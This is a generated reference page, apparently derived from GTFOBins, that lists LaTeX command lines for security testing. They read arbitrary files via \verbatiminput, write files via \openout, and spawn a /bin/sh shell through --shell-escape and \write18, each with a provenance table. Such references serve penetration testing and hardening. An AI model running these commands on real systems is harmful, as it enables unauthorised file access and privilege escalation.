---
parsed_by: focuslocust
source: commands
type: generated
---
# latex Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## latex

Tool page: [latex](../../tools/linux/latex.md)

### file-read

```text
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
strings texput.dvi
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latex` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latex` |
| Evidence | Function example preserved from source parser. |

### shell

```text
latex --shell-escape '\immediate\write18{/bin/sh}'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/latex` |
| Evidence | Function example preserved from source parser. |
